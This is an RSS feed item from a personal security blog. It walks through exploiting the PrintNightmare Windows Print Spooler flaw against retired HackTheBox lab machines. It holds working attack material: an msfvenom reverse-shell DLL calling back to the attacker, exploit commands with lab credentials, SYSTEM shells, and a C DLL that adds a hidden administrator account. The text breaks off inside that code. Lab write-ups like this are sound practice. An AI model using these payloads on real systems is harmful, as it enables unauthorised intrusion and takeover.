<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>msfvenom on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/msfvenom/</link>
    <description>Recent content in msfvenom on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 17 Jul 2021 13:52:01 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/msfvenom/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Play with PrintNightmare using HackTheBox machines</title>
      <link>https://fahmifj.github.io/blog/play-with-printnightmare/</link>
      <pubDate>Sat, 17 Jul 2021 13:52:01 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/play-with-printnightmare/</guid>
      <description>Having fun with a Zero-Day vulnerability</description>
      <content:encoded><![CDATA[<p>For the past week, a lot of InfoSec pros I follow on Twitter were <em>tweeting</em> about a remote code execution vulnerability in the Windows Print  Spooler service that could be used for privilege escalation, and, furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to this vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021  for CVE-2021-1675, which is also a remote code execution in the Windows Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability, but in this post, I would like to play with the vulnerability using <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a> as targets.</p>
<p><strong>[Updated 20-07-2021]</strong></p>
<ul>
<li>Add self-compile payload</li>
</ul>
<h2 id="target-machines">Target Machines</h2>
<p>The following are the retired Windows machines from HackTheBox along with a low privilege user that I will use to play with PrintNightmare.</p>
<center>
<table>
<thead>
<tr>
<th style="text-align:center">Target</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">Low Priv Credentials [username:password]</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Active</td>
<td style="text-align:center">10.10.10.100</td>
<td style="text-align:center">svc_tgs:GPPstillStandingStrong2k18</td>
</tr>
<tr>
<td style="text-align:center">Bastion</td>
<td style="text-align:center">10.10.10.134</td>
<td style="text-align:center">l4mpje:bureaulampje</td>
</tr>
<tr>
<td style="text-align:center">Heist</td>
<td style="text-align:center">10.10.10.149</td>
<td style="text-align:center">hazard:stealth1agent</td>
</tr>
<tr>
<td style="text-align:center">Forest</td>
<td style="text-align:center">10.10.10.161</td>
<td style="text-align:center">svc-alfresco:s3rvice</td>
</tr>
<tr>
<td style="text-align:center">Atom</td>
<td style="text-align:center">10.10.10.237</td>
<td style="text-align:center">jason:kidvscat_electron_@123</td>
</tr>
</tbody>
</table>
</center>
<h2 id="preparation">Preparation</h2>
<p>There are several exploit PoC for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.</p>
<p>But, changing the currently installed impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ python3 -m pip install virtualenv
</code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it must be configured to allow anonymous access, so that the exploit can grab the DLL directly.</p>
<p>That&rsquo;s being said, I will do some preparation.</p>
<h3 id="working-directory">Working Directory</h3>
<p>The first one is a working directory/folder, which I will create one in <code>/opt</code> called <code>printnightmare</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
$ mkdir printnightmare <span class="o">&amp;&amp;</span> <span class="nb">cd</span> printnightmare
</code></pre></div><p>Inside the <code>printnightmare</code> , I will clone the cube0x0 impacket as well as the exploit (<code>CVE-2021-1675-cube0x0</code>).</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ git clone https://github.com/cube0x0/impacket <span class="o">&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
</code></pre></div><p>Next, I will create a virtual environment called  <code>impacket-venv</code> using <code>virtualenv</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ virtualenv impacket-venv
created virtual environment CPython3.9.2.final.0-64 in 614ms
  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/opt/printnightmare/impacket-venv, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/kali/.local/share/virtualenv<span class="o">)</span>
    added seed packages: <span class="nv">pip</span><span class="o">==</span>21.1.3, <span class="nv">setuptools</span><span class="o">==</span>57.1.0, <span class="nv">wheel</span><span class="o">==</span>0.36.2
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
</code></pre></div><p>I will activate the virtual environment with the following commands.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ <span class="nb">source</span> impacket-venv/bin/activate
</code></pre></div><p>Now I can just install the cube0x0 impacket.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ <span class="nb">cd</span> impacket <span class="o">&amp;&amp;</span> python3 setup.py install
running install
running bdist_egg
running egg_info
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h3 id="generate-malicious-dll">Generate Malicious DLL</h3>
<p>The next step is generating a DLL payload.</p>
<p>Under the <code>printnightmare</code> folder, I will create a <code>dll</code> folder.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ mkdir dll
</code></pre></div><p>I could generate the DLL with help of <code>msfvenom</code> . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="m">460</span> bytes
Final size of dll file: <span class="m">8704</span> bytes
</code></pre></div><p>The DLL generated under <code>/opt/printnightmare/dll/[here]</code>.</p>
<blockquote>
<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="">#Troubleshoot</a></p>
</blockquote>
<h3 id="samba-configuration">Samba Configuration</h3>
<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide but I will add some additional lines for logging to the configuration files.</p>
<p>First, I will create a backup of the original Samba configuration file.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
</code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">[global]
   server role = standalone server
   smb ports = 445
   map to guest = bad user
   usershare allow guests = yes
   idmap config * : backend = tdb
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   
[ef]
    comment = Samba
    path = /opt/printnightmare/dll
    guest ok = yes
    read only = no
    browsable = yes
</code></pre></div><p>Lastly, I will start the Samba service.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ sudo systemctl start smbd 
</code></pre></div><h2 id="target-scanning">Target Scanning</h2>
<p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
<ol>
<li>Print Spooler Service enabled on the target system ❔</li>
<li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
<li>Hash or password for a low privileged user (or computer) account  ✔</li>
</ol>
<p>Now to check if the Print Spooler service enabled, I could also follow cube0x0&rsquo;s instruction by using a tool from impacket called <code>rpcdump.py</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ rpcdump.py @<span class="o">[</span>IP-ADDRESS<span class="o">]</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
</code></pre></div><p>I found out that <code>rpcclient</code> can also be used to detect the Print Spooler service by invoking <code>enumprinters</code> command. If the returned output is &ldquo;Could not initialise spoolss&rdquo;, then the Print Spooler is most likely to be disabled.</p>
<p>The following is a dirty bash script I created to do these detections in one run.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
<span class="nv">targets</span><span class="o">=</span><span class="nv">$1</span>

<span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$targets</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="s2">&#34;[-] Usage\t: </span><span class="nv">$0</span><span class="s2"> [Target file]&#34;</span> 
  <span class="nb">echo</span> <span class="s2">&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
  <span class="k">else</span>
	<span class="k">for</span> target in <span class="sb">`</span>cat <span class="nv">$targets</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
		 <span class="nv">ip</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1<span class="k">)</span>
		 <span class="nv">username</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2<span class="k">)</span>
		 <span class="nv">password</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$target</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f3<span class="k">)</span>
		 <span class="nb">echo</span>  <span class="s2">&#34; - [</span><span class="nv">$ip</span><span class="s2">] - &#34;</span> 
		 impacket-rpcdump <span class="nv">$ip</span> <span class="p">|</span> egrep <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
		 rpcclient -U <span class="s2">&#34;</span><span class="nv">$username</span><span class="s2">%</span><span class="nv">$password</span><span class="s2">&#34;</span> <span class="nv">$ip</span> -c <span class="s2">&#34;enumprinters;quit&#34;</span>
	<span class="k">done</span>
<span class="k">fi</span>
</code></pre></div><p>I saved the script as <code>detect-nightmare.sh</code> . I ran the script and it returned the following results.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ ./detect-nightmare.sh target-machines
 - <span class="o">[</span>10.10.10.100<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
 - <span class="o">[</span>10.10.10.134<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
 - <span class="o">[</span>10.10.10.149<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
 - <span class="o">[</span>10.10.10.161<span class="o">]</span> - 
Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
 - <span class="o">[</span>10.10.10.237<span class="o">]</span> - 
Protocol: <span class="o">[</span>MS-PAR<span class="o">]</span>: Print System Asynchronous Remote Protocol 
Protocol: <span class="o">[</span>MS-RPRN<span class="o">]</span>: Print System Remote Protocol 
No printers returned.
</code></pre></div><p>From the results above, Active and Forest don&rsquo;t seem to be vulnerable, but I will still test them out!</p>
<h2 id="exploitation-demo">Exploitation Demo</h2>
<h3 id="htb-active---101010100">HTB: Active - 10.10.10.100</h3>
<p>As expected, on Active, the exploit failed.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>@10.10.10.100 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.100<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Connection Failed
</code></pre></div><p><img class="img-container" src="imgs/image-20210718002853259.png" alt="image-20210718002853259"  />
</p>
<h3 id="htb-bastion---101010134">HTB: Bastion - 10.10.10.134</h3>
<p>I ran the exploit against Bastion, but the DLL got removed by AV 😂.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py Bastion/l4mpje:<span class="s1">&#39;bureaulampje&#39;</span>@10.10.10.134 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.134<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_1734185bdb8f8610<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class="nb">complete</span> successfully because the file contains a virus or potentially unwanted software
</code></pre></div><p><img class="img-container" src="imgs/image-20210718002921209.png" alt="image-20210718002921209"  />
</p>
<p>No problem! The conclusion here is that Bastion was vulnerable.</p>
<h3 id="htb-heist---101010149">HTB: Heist - 10.10.10.149</h3>
<p>On Heist, the exploit didn&rsquo;t show an indication of a successful exploitation.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py heist/hazard:<span class="s1">&#39;stealth1agent&#39;</span>@10.10.10.149 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.149<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</code></pre></div><p>But strangely, I got a shell in my listener.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ nc -nvlp <span class="m">4444</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.149<span class="o">]</span> <span class="m">49700</span>
Microsoft Windows <span class="o">[</span>Version 10.0.17763.437<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;hostname
hostname
SupportDesk

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
</code></pre></div><p><img class="img-container" src="imgs/image-20210717130728398.png" alt="image-20210717130728398"  />
</p>
<h3 id="htb-forest---101010161">HTB: Forest - 10.10.10.161</h3>
<p>Like on Active, the exploit also failed on Forest</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py htb.local/svc-alfresco:<span class="s1">&#39;s3rvice&#39;</span>@10.10.10.161 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.161<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Connection Failed
</code></pre></div><p><img class="img-container" src="imgs/image-20210718002812865.png" alt="image-20210718002812865"  />
</p>
<h3 id="htb-atom---101010237">HTB: Atom - 10.10.10.237</h3>
<p>On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\r</span>evshell.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
...<span class="o">[</span>SNIP<span class="o">]</span>...
impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
</code></pre></div><p>But then the DLL connected to my listener.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ nc -nvlp <span class="m">4444</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
connect to <span class="o">[</span>10.10.14.75<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">62322</span>
Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
hostname
ATOM

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
   IPv4 Address. . . . . . . . . . . : 10.10.10.237
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                       10.10.10.2
</code></pre></div><p><img class="img-container" src="imgs/image-20210717125927762.png" alt="image-20210717125927762"  />
</p>
<p><del>I have no clue why the error happened 😅. If I find out the problem, I&rsquo;ll update this post and write it under the Troubleshoot section.</del></p>
<p>Updated in <a href="#troubleshoot">Troubleshoot</a></p>
<h2 id="troubleshoot">Troubleshoot</h2>
<p>I guess the following error caused by my DLL payload. This is because, instead of using the DLL to create a user (one time load / execution), I use the DLL for performing reverse shell.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
</code></pre></div><p>I wanted to generate my own payload to test but my Visual Studio somehow didn&rsquo;t want me to install the Windows SDK.</p>
<p><img class="img-container" src="imgs/image-20210718024015408.png" alt="image-20210718024015408"  />
</p>
<p>So I stole <a href="https://github.com/fahmifj/PrintNightmare-kit/blob/main/generate-nightmaredll.ps1">this payload</a> from this <a href="https://github.com/calebstewart/CVE-2021-1675">PoC</a> created by Caleb Stewart and John Hammond.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
PS /opt/PrintNightmare/dll&gt; Get-NightmareDLL
<span class="o">[</span>+<span class="o">]</span> Created payload at /opt/printnightmare/dll/nightmare.dll
</code></pre></div><p>I ran the exploit again, but this time it didn&rsquo;t crash, instead it displayed the proper message of a successful exploitation.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> ✗ 
$ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\nightmare.dll&#39;</span>
<span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
<span class="o">[</span>+<span class="o">]</span> Bind OK
<span class="o">[</span>+<span class="o">]</span> pDriverPath Found C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\D</span>riverStore<span class="se">\F</span>ileRepository<span class="se">\n</span>tprint.inf_amd64_c62e9f8067f98247<span class="se">\A</span>md64<span class="se">\U</span>NIDRV.DLL
<span class="o">[</span>*<span class="o">]</span> Executing <span class="se">\?</span>?<span class="se">\U</span>NC<span class="se">\1</span>0.10.14.75<span class="se">\e</span>f<span class="se">\n</span>ightmare.dll
<span class="o">[</span>*<span class="o">]</span> Try 1...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Try 2...
<span class="o">[</span>*<span class="o">]</span> Stage0: <span class="m">0</span>
<span class="o">[</span>*<span class="o">]</span> Stage2: <span class="m">0</span>
<span class="o">[</span>+<span class="o">]</span> Exploit Completed
</code></pre></div><p>Now I can login with credentials of  <code>adm1n:P@ssw0rd</code> (default credentials from the stolen DLL) using <code>evil-winrm</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «dll» «10.10.14.75» 
$ evil-winrm -i 10.10.10.237 -u <span class="s1">&#39;adm1n&#39;</span> -p <span class="s1">&#39;P@ssw0rd&#39;</span>                                                       

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; whoami /groups <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;Administrators&#34;</span>

NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner


*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
ATOM
</code></pre></div><p><img class="img-container" src="imgs/image-20210718025137956.png" alt="image-20210718025137956"  />
</p>
<p><strong>[Update]</strong></p>
<p>Didn&rsquo;t know that <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">BookHackTrick</a> provides some DLL  code templates in C. The following is the one that I use</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// stolen from https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own
</span><span class="c1">// compile: x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</span><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">Entry</span> <span class="p">(){</span> <span class="c1">//Default function that is executed when the DLL is loaded
</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cmd /c net user iamf P@ssw0rd /add; cmd /c net localgroup administrators iamf /add&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">){</span>
        <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
